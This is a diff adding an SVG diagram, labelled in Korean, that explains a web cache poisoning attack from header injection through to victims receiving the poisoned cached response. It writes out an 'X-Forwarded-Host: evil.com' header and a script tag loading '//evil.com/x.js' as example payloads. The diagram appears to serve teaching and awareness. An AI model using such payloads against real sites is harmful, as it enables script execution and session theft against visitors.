@@ -1,0 +1,95 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="540" viewBox="0 0 880 540">
+  <defs>
+    <marker id="arr-red" viewBox="0 0 14 14" refX="12" refY="7"
+            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
+      <path d="M 0 0 L 13 7 L 0 14 z" fill="#e05555"/>
+    </marker>
+    <marker id="arr-blue" viewBox="0 0 14 14" refX="12" refY="7"
+            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
+      <path d="M 0 0 L 13 7 L 0 14 z" fill="#7ec8e3"/>
+    </marker>
+    <marker id="arr-green" viewBox="0 0 14 14" refX="12" refY="7"
+            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
+      <path d="M 0 0 L 13 7 L 0 14 z" fill="#55c555"/>
+    </marker>
+    <marker id="arr-orange" viewBox="0 0 14 14" refX="12" refY="7"
+            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
+      <path d="M 0 0 L 13 7 L 0 14 z" fill="#e09040"/>
+    </marker>
+  </defs>
+
+  <rect width="880" height="540" fill="#0a0a0a" rx="12"/>
+
+  <!-- Title -->
+  <text x="440" y="44" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="22" font-weight="700" fill="#e8e8e8">웹 캐시 포이즈닝 공격 흐름</text>
+
+  <!-- Phase labels -->
+  <text x="60" y="90" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" fill="#7777cc">① 캐시 오염 단계</text>
+  <text x="60" y="320" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" fill="#e05555">② 피해 전파 단계</text>
+
+  <!-- PHASE 1: Cache Poisoning -->
+  <!-- Attacker box -->
+  <rect x="60" y="108" width="140" height="64" rx="8" fill="#1a0a0a" stroke="#e05555" stroke-width="1.5"/>
+  <text x="130" y="134" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#e05555">공격자</text>
+  <text x="130" y="155" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#888">조작된 헤더 주입</text>
+
+  <!-- Cache Server box -->
+  <rect x="340" y="108" width="200" height="64" rx="8" fill="#0a1020" stroke="#7ec8e3" stroke-width="1.5"/>
+  <text x="440" y="134" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#7ec8e3">CDN / 캐시 서버</text>
+  <text x="440" y="155" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#888">오염된 응답 저장</text>
+
+  <!-- Origin Server box -->
+  <rect x="680" y="108" width="140" height="64" rx="8" fill="#0a100a" stroke="#55c555" stroke-width="1.5"/>
+  <text x="750" y="134" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#55c555">오리진 서버</text>
+  <text x="750" y="155" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#888">정상 응답 반환</text>
+
+  <!-- Arrow: Attacker -> Cache -->
+  <line x1="200" y1="140" x2="338" y2="140" stroke="#e05555" stroke-width="2" marker-end="url(#arr-red)"/>
+  <text x="270" y="128" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="11" fill="#e05555">X-Forwarded-Host: evil.com</text>
+
+  <!-- Arrow: Cache -> Origin -->
+  <line x1="540" y1="140" x2="678" y2="140" stroke="#7ec8e3" stroke-width="2" marker-end="url(#arr-blue)"/>
+  <text x="610" y="128" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="11" fill="#7ec8e3">요청 전달</text>
+
+  <!-- Cached poisoned response box -->
+  <rect x="280" y="220" width="320" height="72" rx="8" fill="#000000" stroke="#3a4a6e" stroke-width="1"/>
+  <text x="300" y="244" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#7ec8e3" font-weight="600" xml:space="preserve">HTTP/1.1 200 OK</text>
+  <text x="300" y="262" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ffffff" xml:space="preserve">Cache-Control: public</text>
+  <text x="300" y="280" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="13" fill="#ce9178" xml:space="preserve">&lt;script src="//evil.com/x.js"&gt;</text>
+
+  <!-- Arrow down to cache box -->
+  <line x1="440" y1="172" x2="440" y2="219" stroke="#e09040" stroke-width="2" stroke-dasharray="4,4" marker-end="url(#arr-orange)"/>
+  <text x="452" y="200" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="11" fill="#e09040">캐시 저장 (TTL 동안 유지)</text>
+
+  <!-- PHASE 2: Victim receives poisoned response -->
+  <!-- Victim 1 -->
+  <rect x="60" y="338" width="120" height="58" rx="8" fill="#100a0a" stroke="#e05555" stroke-width="1"/>
+  <text x="120" y="362" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" font-weight="600" fill="#e05555">피해자 A</text>
+  <text x="120" y="380" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="11" fill="#888">정상 요청</text>
+
+  <!-- Victim 2 -->
+  <rect x="220" y="338" width="120" height="58" rx="8" fill="#100a0a" stroke="#e05555" stroke-width="1"/>
+  <text x="280" y="362" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" font-weight="600" fill="#e05555">피해자 B</text>
+  <text x="280" y="380" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="11" fill="#888">정상 요청</text>
+
+  <!-- Victim 3 -->
+  <rect x="380" y="338" width="120" height="58" rx="8" fill="#100a0a" stroke="#e05555" stroke-width="1"/>
+  <text x="440" y="362" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" font-weight="600" fill="#e05555">피해자 C</text>
+  <text x="440" y="380" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="11" fill="#888">정상 요청</text>
+
+  <!-- Cache server (phase 2) -->
+  <rect x="610" y="338" width="200" height="58" rx="8" fill="#0a1020" stroke="#7ec8e3" stroke-width="1.5"/>
+  <text x="710" y="362" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#7ec8e3">CDN / 캐시 서버</text>
+  <text x="710" y="380" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#e05555">오염된 응답 반환</text>
+
+  <!-- Arrows: Victims -> Cache -->
+  <line x1="180" y1="367" x2="608" y2="367" stroke="#e05555" stroke-width="1.5" stroke-dasharray="4,4" marker-end="url(#arr-red)"/>
+  <line x1="340" y1="367" x2="608" y2="367" stroke="#e05555" stroke-width="1.5" stroke-dasharray="4,4"/>
+  <line x1="500" y1="367" x2="608" y2="367" stroke="#e05555" stroke-width="1.5" stroke-dasharray="4,4"/>
+
+  <!-- Impact box -->
+  <rect x="60" y="440" width="760" height="68" rx="8" fill="#1a0505" stroke="#e05555" stroke-width="1"/>
+  <text x="440" y="464" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#e05555">공격 결과</text>
+  <text x="440" y="484" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#888">모든 방문자가 오염된 캐시를 받음 — XSS 실행 · 세션 탈취 · 악성 리다이렉트 · 피싱 페이지 제공</text>
+  <text x="440" y="500" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#888">캐시 TTL이 만료될 때까지 지속 (수분 ~ 수시간)</text>
+</svg>
